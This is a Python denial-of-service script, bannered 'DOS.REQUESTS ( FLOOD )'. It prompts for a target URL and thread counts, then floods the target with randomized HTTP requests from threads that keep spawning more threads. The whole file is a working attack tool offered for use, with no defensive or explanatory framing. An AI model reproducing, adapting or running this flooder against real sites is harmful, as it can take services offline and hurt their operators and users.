import requests,urllib3,threading,httpx,random,time,os

methods = ['GET','POST','HEAD','OPTIONS','DELETE','PUT','PATCH']
packet_booter = ['5','50','55','500','555','5000','5555','50000','55555','500000','555555']
booter_create = ['5','15','25','35','45','55','65','75','95']
status_code_atk = False

def req_send(URL,booter_load):
    global status_code_atk,methods
    if status_code_atk == True:
        me = random.choice((methods))
        booter = random.choice((packet_booter))
        arrow_set = '-'*len(booter)
        arrow = f'{arrow_set}>'
        try:
            print(f'[SEND PACKET] BOOTER={booter} METHODS={me} {arrow} {URL}')
            for _ in range(int(booter)):
                http = urllib3.PoolManager()
                h2 = httpx.request(me,URL)
                r = http.request(me, URL)
                r = http.request_encode_url(me, URL)
                r = http.request_encode_body(me, URL)
                s = requests.request(me, URL)
            for _ in range(int(booter_load)):
               threading.Thread(target=req_send,args=(URL,booter_load)).start()
        except:
           print(f'[FAILED] BOOTER={booter} METHODS={me} {arrow} X {URL}')
    else:
        threading.Thread(target=req_send,args=(URL,booter_load)).start()
banner = '''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX / 
 / XXXXXX /
(________(   
 `------' 

 DOS.REQUESTS ( FLOOD )'''
print(banner)
URL = input('URL $')
TIME = input('THREAD $')
print("OLD SET 5")
booter_load = int(input('RE-CREATE $'))
num = 0
num2 = 0
for num in range(int(TIME)):
   num += 1
   create = random.choice((booter_create))
   print(f'[{num}] CREATE THREAD_SPAM={create} . . . .')
   for _ in range(int(create)):
    num2 += 1
    threading.Thread(target=req_send,args=(URL,booter_load)).start()
print(f'[STATUS] MAKE THREAD={num} SPAM_THREAD={num2}')
time.sleep(1)
status_code_atk = True